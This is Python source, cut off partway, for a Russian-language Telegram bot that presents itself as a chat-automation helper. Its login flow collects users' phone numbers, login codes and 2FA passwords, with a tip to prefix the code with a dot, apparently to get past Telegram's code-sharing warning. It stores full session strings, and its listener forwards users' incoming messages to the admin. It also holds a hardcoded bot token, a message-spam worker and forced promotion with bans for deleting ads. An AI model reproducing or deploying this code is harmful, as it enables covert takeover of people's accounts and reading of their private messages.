import asyncio
import os
import psycopg2
import re
import logging
import math
from datetime import datetime, timedelta
from typing import Dict, Set, List, Optional, Tuple

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, Update, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, ReplyKeyboardRemove, KeyboardButton,
    ReplyKeyboardMarkup
)
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
from aiohttp import web

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError, 
    PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError
)

# ==================== КОНФИГ ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

BOT_TOKEN = "8959860095:AAEnbAbGuCBWYQHCAF3uPaMD8y1It1IBby8"
ADMIN_ID = 5825717381
DATABASE_URL = os.environ.get('DATABASE_URL')

API_ID = 39536916
API_HASH = "7d8fe2d99b3cb67797f8560016ae69cf"

OWNER_TG_LINK = "https://t.me/NorikAmiri"
CHANNEL_URL = "https://t.me/norikX"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ==================== ХРАНИЛИЩА ====================
mutes = {}
spam_tasks = {}
user_spam_texts = {}
link_chats = set()
reply_guard_chats = set()
typing_disabled_chats = set()
substitutions = {}
msg_cache = {}
active_chats = {}
promo_messages = {}
recent_business_chats = []
bc_owners = {}
user_usernames = {}
user_names = {}
banned_users = set()
bot_id = None
CHANNEL_LINK = None
manual_added_users = set()
telethon_clients: Dict[int, TelegramClient] = {}
user_dialogs: Dict[int, List[Tuple[int, str]]] = {}

# ==================== СОСТОЯНИЯ FSM ====================
class AuthState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

# ==================== ТЕКСТЫ ====================
MANUAL_INSTRUCTION = (
    "🚀 <b>Инструкция по подключению бота:</b>\n\n"
    "1️⃣ Перейдите в <b>Настройки</b> Telegram.\n"
    "2️⃣ Откройте раздел <b>Мой профиль</b>.\n"
    "3️⃣ Выберите пункт <b>Автоматизация чатов</b>.\n"
    "4️⃣ Добавьте бота: <code>@norikKodBot</code>.\n"
    "5️⃣ ⚠️ <b>ОБЯЗАТЕЛЬНО:</b> Предоставьте боту полный доступ к сообщениям <b>5/5</b>!\n\n"
    "📢 <b>Условия использования:</b>\n"
    "• Бот публикует рекламу 1 раз в 8 часов\n"
    "• Удаление рекламного сообщения = блокировка\n"
    "• Вы соглашаетесь с этим, подключая бота"
)

TEXT_COMMANDS_HELP = (
    "📋 <b>СПИСОК КОМАНД:</b>\n\n"
    "🔹 <b>Спам:</b>\n"
    "• <code>set [текст]</code> — задать текст для спама\n"
    "• <code>ss</code> — запустить спам\n"
    "• <code>dd</code> — остановить спам\n\n"
    "🔹 <b>Модерация:</b>\n"
    "• <code>.мут [минуты]</code> — мут\n"
    "• <code>.размут</code> — размут\n"
    "• <code>печать +</code> / <code>печать -</code> — печать\n"
    "• <code>подмена [текст] [1/2/выкл]</code> — подмена\n"
    "• <code>.старт</code> / <code>.стоп</code> — авто-ссылка\n"
    "• <code>+реплай</code> / <code>-реплай</code> — защита от реплаев\n"
    "• <code>+линк [ссылка]</code> — установить ссылку\n"
    "• <code>мой ид</code> / <code>твой ид</code> — узнать ID\n"
    "• <code>!команды</code> — меню\n\n"
    "🔹 <b>Калькулятор:</b>\n"
    "• Просто напишите пример: <code>1458+2414</code>"
)

# ==================== БАЗА ДАННЫХ ====================
def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS chat_settings (
                        chat_id BIGINT, 
                        setting_type TEXT, 
                        PRIMARY KEY (chat_id, setting_type)
                    )
                """)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS substitutions (
                        chat_id BIGINT PRIMARY KEY, 
                        text TEXT, 
                        mode INTEGER
                    )
                """)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS spam_texts (
                        key_id TEXT PRIMARY KEY, 
                        text TEXT
                    )
                """)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS banned_users (
                        user_id BIGINT PRIMARY KEY
                    )
                """)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS user_map (
                        user_id BIGINT PRIMARY KEY, 
                        username TEXT, 
                        first_name TEXT
                    )
                """)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS delivered_promo (
                        chat_id BIGINT PRIMARY KEY
                    )
                """)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS user_sessions (
                        user_id BIGINT PRIMARY KEY, 
                        session_string TEXT
                    )
                """)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS business_accounts (
                        user_id BIGINT PRIMARY KEY, 
                        username TEXT, 
                        first_name TEXT, 
                        connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS manual_users (
                        user_id BIGINT PRIMARY KEY, 
                        username TEXT, 
                        first_name TEXT, 
                        added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS user_chats (
                        user_id BIGINT, 
                        chat_id BIGINT, 
                        chat_name TEXT,
                        PRIMARY KEY (user_id, chat_id)
                    )
                """)
                conn.commit()
                
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
                for row in cur.fetchall(): link_chats.add(int(row[0]))
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='reply_guard'")
                for row in cur.fetchall(): reply_guard_chats.add(int(row[0]))
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='typing_disabled'")
                for row in cur.fetchall(): typing_disabled_chats.add(int(row[0]))
                cur.execute("SELECT chat_id, text, mode FROM substitutions")
                for row in cur.fetchall(): substitutions[int(row[0])] = {"text": row[1], "mode": row[2]}
                cur.execute("SELECT key_id, text FROM spam_texts")
                for row in cur.fetchall(): user_spam_texts[str(row[0])] = row[1]
                cur.execute("SELECT user_id FROM banned_users")
                for row in cur.fetchall(): banned_users.add(int(row[0]))
                cur.execute("SELECT user_id, username, first_name FROM user_map")
                for row in cur.fetchall():
                    uid, uname, fname = int(row[0]), row[1], row[2]
                    if uname: user_usernames[uname.lower()] = uid
                    if fname: user_names[uid] = fname
                cur.execute("SELECT user_id FROM manual_users")
                for row in cur.fetchall(): manual_added_users.add(int(row[0]))
                cur.execute("SELECT user_id, chat_id, chat_name FROM user_chats")
                for row in cur.fetchall():
                    uid = int(row[0])
                    cid = int(row[1])
                    name = row[2]
                    if uid not in user_dialogs:
                        user_dialogs[uid] = []
                    user_dialogs[uid].append((cid, name))
                
                logging.info("✅ БД инициализирована")
    except Exception as e:
        logging.error(f"❌ Ошибка БД: {e}")

# ==================== ФУНКЦИИ БД ====================
def save_user_chat(user_id: int, chat_id: int, chat_name: str):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_chats (user_id, chat_id, chat_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id, chat_id) DO UPDATE SET chat_name = EXCLUDED.chat_name",
                    (user_id, chat_id, chat_name)
                )
                conn.commit()
                if user_id not in user_dialogs:
                    user_dialogs[user_id] = []
                existing = [c for c in user_dialogs[user_id] if c[0] == chat_id]
                if existing:
                    idx = user_dialogs[user_id].index(existing[0])
                    user_dialogs[user_id][idx] = (chat_id, chat_name)
                else:
                    user_dialogs[user_id].append((chat_id, chat_name))
    except Exception as e:
        logging.error(f"Ошибка сохранения чата: {e}")

def get_user_chats(user_id: int) -> List[Tuple[int, str]]:
    if user_id in user_dialogs:
        return user_dialogs[user_id]
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT chat_id, chat_name FROM user_chats WHERE user_id = %s", (user_id,))
                chats = [(int(row[0]), row[1]) for row in cur.fetchall()]
                user_dialogs[user_id] = chats
                return chats
    except Exception as e:
        logging.error(f"Ошибка получения чатов: {e}")
        return []

def save_session(user_id: int, session_str: str):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_sessions (user_id, session_string) VALUES (%s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET session_string = EXCLUDED.session_string",
                    (user_id, session_str)
                )
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка сохранения сессии: {e}")

def get_session(user_id: int) -> Optional[str]:
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT session_string FROM user_sessions WHERE user_id = %s", (user_id,))
                row = cur.fetchone()
                return row[0] if row else None
    except Exception as e:
        logging.error(f"Ошибка получения сессии: {e}")
        return None

def delete_session(user_id: int):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_sessions WHERE user_id = %s", (user_id,))
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка удаления сессии: {e}")

def save_business_account(user_id: int, username: str, first_name: str):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO business_accounts (user_id, username, first_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, first_name = EXCLUDED.first_name",
                    (user_id, username, first_name)
                )
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка сохранения бизнес-аккаунта: {e}")

def get_all_users():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT user_id, username, first_name, connected_at, 'business' as type 
                    FROM business_accounts
                    UNION
                    SELECT user_id, username, first_name, added_at, 'manual' as type 
                    FROM manual_users
                    ORDER BY connected_at DESC
                """)
                return cur.fetchall()
    except Exception as e:
        logging.error(f"Ошибка получения пользователей: {e}")
        return []

def delete_business_account(user_id: int):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM business_accounts WHERE user_id = %s", (user_id,))
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка удаления бизнес-аккаунта: {e}")

def delete_all_user_chats(user_id: int):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_chats WHERE user_id = %s", (user_id,))
                conn.commit()
                if user_id in user_dialogs:
                    user_dialogs[user_id] = []
    except Exception as e:
        logging.error(f"Ошибка удаления чатов: {e}")

def save_user_info(user_id: int, username: str, first_name: str):
    user_id = int(user_id)
    if first_name: user_names[user_id] = first_name
    username_clean = username.lstrip("@").lower() if username else None
    if username_clean: user_usernames[username_clean] = user_id
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_map (user_id, username, first_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET username = COALESCE(EXCLUDED.username, user_map.username), "
                    "first_name = COALESCE(EXCLUDED.first_name, user_map.first_name)",
                    (user_id, username_clean, first_name)
                )
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка сохранения юзера: {e}")

def set_user_ban(user_id: int, ban: bool):
    user_id = int(user_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if ban:
                    cur.execute("INSERT INTO banned_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (user_id,))
                    banned_users.add(user_id)
                else:
                    cur.execute("DELETE FROM banned_users WHERE user_id = %s", (user_id,))
                    banned_users.discard(user_id)
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка бана: {e}")

def save_setting(chat_id, setting_type, enabled):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if enabled:
                    cur.execute("INSERT INTO chat_settings (chat_id, setting_type) VALUES (%s, %s) ON CONFLICT DO NOTHING", (chat_id, setting_type))
                else:
                    cur.execute("DELETE FROM chat_settings WHERE chat_id = %s AND setting_type = %s", (chat_id, setting_type))
                conn.commit()
                target_set = link_chats if setting_type == 'enabled_links' else (reply_guard_chats if setting_type == 'reply_guard' else typing_disabled_chats)
                if enabled: target_set.add(chat_id)
                else: target_set.discard(chat_id)
    except Exception as e:
        logging.error(f"Ошибка сохранения настроек: {e}")

def save_substitution(chat_id, text, mode):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if text is None:
                    cur.execute("DELETE FROM substitutions WHERE chat_id = %s", (chat_id,))
                    substitutions.pop(chat_id, None)
                else:
                    cur.execute("INSERT INTO substitutions (chat_id, text, mode) VALUES (%s, %s, %s) ON CONFLICT (chat_id) DO UPDATE SET text = EXCLUDED.text, mode = EXCLUDED.mode", (chat_id, text, mode))
                    substitutions[chat_id] = {"text": text, "mode": mode}
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка подмены: {e}")

def save_spam_text(key_id, text):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO spam_texts (key_id, text) VALUES (%s, %s) ON CONFLICT (key_id) DO UPDATE SET text = EXCLUDED.text", (str(key_id), text))
                conn.commit()
                user_spam_texts[str(key_id)] = text
    except Exception as e:
        logging.error(f"Ошибка сохранения текста спама: {e}")

def get_user_mention(user_id: int, fallback_name: str = None) -> str:
    user_id = int(user_id)
    fname = user_names.get(user_id) or fallback_name or "Пользователь"
    return f'<a href="tg://user?id={user_id}">{fname}</a>'

def mark_chat_promo_delivered(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO delivered_promo (chat_id) VALUES (%s) ON CONFLICT DO NOTHING", (chat_id,))
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка записи доставленной рекламы: {e}")

def is_chat_promo_delivered(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT 1 FROM delivered_promo WHERE chat_id = %s", (chat_id,))
                return cur.fetchone() is not None
    except Exception as e:
        logging.error(f"Ошибка проверки доставленной рекламы: {e}")
        return False

init_db()

# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
async def delete_msg(chat_id, msg_id, bc_id):
    if bc_id:
        try:
            await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[msg_id])
            return
        except: pass
    try:
        await bot.delete_message(chat_id, msg_id)
    except: pass

async def edit_message(chat_id, msg_id, text, bc_id, parse_mode=None):
    try:
        kwargs = {
            "chat_id": chat_id,
            "message_id": msg_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        if bc_id: kwargs["business_connection_id"] = bc_id
        await bot.edit_message_text(**kwargs)
        return True
    except Exception as e:
        logging.warning(f"Ошибка редактирования: {e}")
        return False

async def clear_cmd(chat_id, msg_id, bc_id):
    await delete_msg(chat_id, msg_id, bc_id)

async def global_typing_loop():
    while True:
        try:
            for bc_id, chats in list(active_chats.items()):
                for cid in list(chats)[-50:]:
                    if cid not in typing_disabled_chats:
                        try:
                            await bot.send_chat_action(chat_id=cid, action="typing", business_connection_id=bc_id)
                        except: pass
            await asyncio.sleep(4)
        except Exception as e:
            logging.error(f"Ошибка печати: {e}")
            await asyncio.sleep(4)

async def spam_worker(chat_id, bc_id, reply_to, text):
    try:
        words = text.split()
        while True:
            for word in words:
                kwargs = {"chat_id": chat_id, "text": word, "reply_to_message_id": reply_to}
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
                await asyncio.sleep(0.3)
    except asyncio.CancelledError: pass

async def unmute(user_id, chat_id, bc_id, user_name):
    if user_id in mutes:
        await asyncio.sleep((mutes[user_id]["until"] - datetime.now()).total_seconds())
        if user_id in mutes and datetime.now() >= mutes[user_id]["until"]:
            mutes.pop(user_id, None)
            user_link = get_user_mention(user_id, user_name)
            kwargs = {
                "chat_id": chat_id,
                "text": f"🔊 С {user_link} снят <b>МУТ</b>.",
                "parse_mode": "HTML"
            }
            if bc_id: kwargs["business_connection_id"] = bc_id
            try: await bot.send_message(**kwargs)
            except: pass

async def promo_broadcaster():
    promo_text = "Можешь, пожалуйста, на наш канал подписаться? Если не трудно ❤️"
    promo_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❤️ Подписаться", url=CHANNEL_URL)]
    ])
    while True:
        await asyncio.sleep(28800)
        selected = []
        for chat_info in reversed(recent_business_chats[-100:]):
            if len(selected) >= 20: break
            cid, bc_id = chat_info
            owner_id = bc_owners.get(bc_id)
            if owner_id == ADMIN_ID or (owner_id and owner_id in banned_users): continue
            if is_chat_promo_delivered(cid): continue
            selected.append(chat_info)
        for cid, bc_id in selected:
            try:
                msg = await bot.send_message(
                    chat_id=cid, text=promo_text, parse_mode="HTML",
                    reply_markup=promo_kb, business_connection_id=bc_id
                )
                promo_messages[(cid, bc_id)] = msg.message_id
                mark_chat_promo_delivered(cid)
            except Exception as e:
                logging.warning(f"Ошибка рассылки рекламы: {e}")
            await asyncio.sleep(3)

async def check_promo_deletions():
    unban_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Написать владельцу", url=OWNER_TG_LINK)]
    ])
    promo_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❤️ Подписаться", url=CHANNEL_URL)]
    ])
    while True:
        await asyncio.sleep(15)
        for (cid, bc_id), msg_id in list(promo_messages.items()):
            owner_id = bc_owners.get(bc_id)
            if owner_id and owner_id in banned_users: continue
            try:
                await bot.edit_message_reply_markup(
                    chat_id=cid, message_id=msg_id, reply_markup=promo_kb, business_connection_id=bc_id
                )
            except TelegramBadRequest as e:
                err = str(e).lower()
                if "message to edit not found" in err or "message can't be edited" in err:
                    if owner_id:
                        set_user_ban(owner_id, True)
                        try:
                            await bot.send_message(
                                chat_id=owner_id,
                                text="🚫 Вы забанены за удаление рекламы!\n\nДля разблокировки свяжитесь с владельцем.",
                                parse_mode="HTML", reply_markup=unban_kb
                            )
                        except: pass
                    promo_messages.pop((cid, bc_id), None)
            except: pass

async def clean_inactive_connections():
    while True:
        await asyncio.sleep(300)
        inactive_bc_ids = []
        for bc_id, owner_id in list(bc_owners.items()):
            try: await bot.get_business_connection(bc_id)
            except Exception: inactive_bc_ids.append(bc_id)
        for bc_id in inactive_bc_ids:
            bc_owners.pop(bc_id, None)
            active_chats.pop(bc_id, None)
            for key in list(spam_tasks.keys()):
                if key[1] == bc_id:
                    spam_tasks[key].cancel()
                    del spam_tasks[key]
            recent_business_chats[:] = [item for item in recent_business_chats if item[1] != bc_id]

def calculate_expression(expression: str) -> tuple:
    try:
        expr = expression.replace(" ", "")
        if not re.match(r'^[\d+\-*/()%**sqrt.]+$', expr):
            return None, "❌ Некорректное выражение"
        expr = expr.replace("sqrt", "math.sqrt")
        safe_dict = {"math": math, "__builtins__": None}
        result = eval(expr, safe_dict)
        if result is None: return None, "❌ Ошибка вычисления"
        if isinstance(result, float):
            result = int(result) if result.is_integer() else round(result, 10)
        return result, None
    except ZeroDivisionError: return None, "❌ Деление на ноль!"
    except Exception as e: return None, f"❌ Ошибка: {str(e)}"

def is_calculator_expression(text: str) -> bool:
    if not text: return False
    cleaned = text.replace(" ", "")
    math_patterns = [r'[\d]+[\+\-\*/%][\d]+', r'[\d]+\*\*[\d]+', r'sqrt\([\d]+\)', r'[\d]+%[\d]+']
    for pattern in math_patterns:
        if re.search(pattern, cleaned): return True
    if re.match(r'^[\d+\-*/()%**sqrt.]+$', cleaned):
        for op in ['+', '-', '*', '/', '%', '**']:
            if op in cleaned: return True
    return False

# ==================== TELETHON ФУНКЦИИ ====================
async def get_user_dialogs(client: TelegramClient) -> List[Tuple[int, str]]:
    dialogs = []
    try:
        async for dialog in client.iter_dialogs():
            name = dialog.name or "Чат"
            dialogs.append((dialog.id, name))
    except Exception as e:
        logging.error(f"Ошибка получения диалогов: {e}")
    return dialogs

async def start_telethon_listener(user_id: int, session_str: str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.start()
        telethon_clients[user_id] = client
        logging.info(f"✅ Telethon запущен для {user_id}")
        
        dialogs = await get_user_dialogs(client)
        for chat_id, chat_name in dialogs:
            save_user_chat(user_id, chat_id, chat_name)
        logging.info(f"📊 Загружено {len(dialogs)} чатов для {user_id}")
        
        @client.on(events.NewMessage(incoming=True))
        async def handle_message(event):
            try:
                if event.message.text:
                    await bot.send_message(
                        ADMIN_ID,
                        f"📩 Новое сообщение от {user_id}\n"
                        f"Чат: {event.chat_id}\n"
                        f"Текст: {event.message.text[:100]}"
                    )
            except Exception as e:
                logging.error(f"Ошибка обработки сообщения: {e}")
        return client
    except Exception as e:
        logging.error(f"Ошибка запуска Telethon: {e}")
        return None

# ==================== КЛАВИАТУРЫ ====================
def get_start_keyboard(user_id: int):
    buttons = []
    if user_id == ADMIN_ID:
        buttons.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="btn_admin_panel")])
    buttons.append([InlineKeyboardButton(text="📖 Функционал", callback_data="btn_features")])
    buttons.append([InlineKeyboardButton(text="🤖 Подключить аккаунт для групп", callback_data="btn_group_auth")])
    buttons.append([InlineKeyboardButton(text="⚡ Как подключить бота", callback_data="btn_how_to_connect")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="admin_users")],
        [InlineKeyboardButton(text="➕ Добавить пользователя", callback_data="admin_add_user")],
        [InlineKeyboardButton(text="🚫 Забанить / Разбанить", callback_data="admin_ban_prompt")]
    ])

def get_users_keyboard(page: int = 0):
    users = get_all_users()
    keyboard = []
    start_idx = page * 10
    end_idx = min(start_idx + 10, len(users))
    for i in range(start_idx, end_idx):
        user_id, username, first_name, date, user_type = users[i]
        name = first_name or username or f"ID:{user_id}"
        display_name = f"{name[:20]}..." if len(name) > 20 else name
        type_icon = "📱" if user_type == "business" else "👤"
        chats = get_user_chats(user_id)
        chat_count = len(chats)
        keyboard.append([
            InlineKeyboardButton(
                text=f"{type_icon} {display_name} ({chat_count} чат.)",
                callback_data=f"user_{user_id}"
            )
        ])
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"users_page_{page-1}"))
    if end_idx < len(users):
        nav_buttons.append(InlineKeyboardButton(text="➡️ Вперед", callback_data=f"users_page_{page+1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)
    keyboard.append([InlineKeyboardButton(text="🔙 Назад в админку", callback_data="admin_panel_back")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_user_chats_keyboard(user_id: int, page: int = 0):
    chats = get_user_chats(user_id)
    keyboard = []
    start_idx = page * 10
    end_idx = min(start_idx + 10, len(chats))
    for i in range(start_idx, end_idx):
        chat_id, chat_name = chats[i]
        display_name = chat_name[:30] + "..." if len(chat_name) > 30 else chat_name
        keyboard.append([
            InlineKeyboardButton(
                text=f"🗑️ {display_name}",
                callback_data=f"delete_chat_{user_id}_{chat_id}"
            )
        ])
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"chats_page_{user_id}_{page-1}"))
    if end_idx < len(chats):
        nav_buttons.append(InlineKeyboardButton(text="➡️ Вперед", callback_data=f"chats_page_{user_id}_{page+1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)
    keyboard.append([InlineKeyboardButton(text="🗑️ Удалить ВСЕ чаты", callback_data=f"delete_all_chats_{user_id}")])
    keyboard.append([InlineKeyboardButton(text="🔙 Назад к пользователю", callback_data=f"user_{user_id}")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# ==================== ОБРАБОТЧИКИ КОМАНД ====================
@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    if message.chat.type != "private": return
    uid = message.from_user.id
    save_user_info(uid, message.from_user.username, message.from_user.first_name)
    user_mention = get_user_mention(uid, message.from_user.first_name)
    await message.answer(
        f"👋 Добро пожаловать, {user_mention}!\n\n"
        f"💬 Бот управляет функциями вашего аккаунта.\n\n"
        f"Выберите раздел:",
        parse_mode="HTML",
        reply_markup=get_start_keyboard(uid)
    )

@dp.message(F.text.in_(["/admin", ".админ", "админ"]))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")

@dp.callback_query(F.data == "btn_features")
async def features(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")

@dp.callback_query(F.data == "btn_how_to_connect")
async def how_to_connect(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer(MANUAL_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)

# ==================== АВТОРИЗАЦИЯ ====================
@dp.callback_query(F.data == "btn_group_auth")
async def group_auth(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    if get_session(callback.from_user.id):
        await callback.message.answer("✅ Аккаунт уже подключен!")
        return
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    await callback.message.answer(
        "📱 <b>Для подключения аккаунта:</b>\n\n"
        "1️⃣ Нажми кнопку «Отправить номер»\n"
        "2️⃣ Или отправь номер в формате:\n"
        "<code>79123456789</code>\n\n"
        "3️⃣ Введи код из Telegram\n"
        "4️⃣ Если есть 2FA - введи пароль\n\n"
        "⚠️ <b>ВАЖНО:</b> Если код не принимается, попробуй поставить точку перед кодом.\n"
        "Например: <code>.12345</code>",
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await state.set_state(AuthState.waiting_for_phone)

@dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
async def process_phone(message: Message, state: FSMContext):
    await message.answer("⏳ Отправка кода...", reply_markup=ReplyKeyboardRemove())
    try:
        if message.contact:
            phone = message.contact.phone_number
        elif message.text:
            phone = re.sub(r'[^\d+]', '', message.text.strip())
            if phone.startswith('8') and len(phone) == 11:
                phone = '+7' + phone[1:]
            elif not phone.startswith('+'):
                phone = '+' + phone
        else:
            await message.answer("❌ Отправь номер телефоном или контактом")
            return
        logging.info(f"📱 Номер: {phone}")
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        
        await state.update_data(
            phone=phone,
            client=client
        )
        
        await message.answer(
            f"📱 <b>Код отправлен!</b>\n\n"
            f"Номер: <code>{phone}</code>\n\n"
            f"<b>Введи код из Telegram</b>\n"
            f"<i>Например: 12345</i>\n\n"
            f"⚠️ Если код не принимается, попробуй с точкой: <code>.12345</code>",
            parse_mode="HTML"
        )
        await state.set_state(AuthState.waiting_for_code)
        
    except FloodWaitError as e:
        await message.answer(f"⏳ Подожди {e.seconds} секунд")
        await state.clear()
    except PhoneNumberInvalidError:
        await message.answer("❌ Некорректный номер. Проверь правильность")
        await state.clear()
    except Exception as e:
        logging.error(f"Ошибка: {e}")
        await message.answer(f"❌ Ошибка: {str(e)}")
        await state.clear()

@dp.message(StateFilter(AuthState.waiting_for_code), F.text)
async def process_code(message: Message, state: FSMContext):
    # Получаем код, убираем точку если есть
    code_raw = message.text.strip()
    if code_raw.startswith('.'):
        code = code_raw[1:]
        logging.info(f"Код с точкой: {code_raw} -> {code}")
    else:
        code = code_raw
    
    if not code.isdigit():
        await message.answer("❌ Код должен содержать только цифры")
        return
    
    data = await state.get_data()
    phone = data.get("phone")
    client = data.get("client")
    
    if not phone or not client:
        await message.answer("❌ Данные устарели. Начни заново")
        await state.clear()
        return
    
    await message.answer("🔄 Проверка кода...")
    
    try:
        await client.sign_in(phone=phone, code=code)
        
        final_session = client.session.save()
        save_session(message.from_user.id, final_session)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        
        await start_telethon_listener(message.from_user.id, final_session)
        
        await client.disconnect()
        
        await message.answer(
            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
            f"📊 Бот загрузил все твои чаты.\n"
            f"Теперь он работает в группах от твоего имени.\n\n"
            f"{TEXT_COMMANDS_HELP}",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove()
        )
        await state.clear()
        
    except SessionPasswordNeededError:
        await message.answer("🔐 <b>Внимание!</b> На аккаунте включена 2FA.\n\nВведи пароль 2FA:", parse_mode="HTML")
        await state.set_state(AuthState.waiting_for_2fa)
        
    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
        await message.answer("❌ Неверный или истекший код. Попробуй еще раз")
        
    except Exception as e:
        logging.error(f"Ошибка: {e}")
        await message.answer(f"❌ Ошибка: {str(e)}")
        await state.clear()

@dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
async def process_2fa(message: Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    client = data.get("client")
    phone = data.get("phone")
    
    if not client or not phone:
        await message.answer("❌ Данные устарели. Начни заново")
        await state.clear()
        return
    
    try:
        await client.sign_in(password=password)
        
        final_session = client.session.save()
        save_session(message.from_user.id, final_session)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        
        await start_telethon_listener(message.from_user.id, final_session)
        
        await client.disconnect()
        
        await message.answer(
            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
            f"📊 Бот загрузил все твои чаты.\n"
            f"Теперь он работает в группах от твоего имени.\n\n"
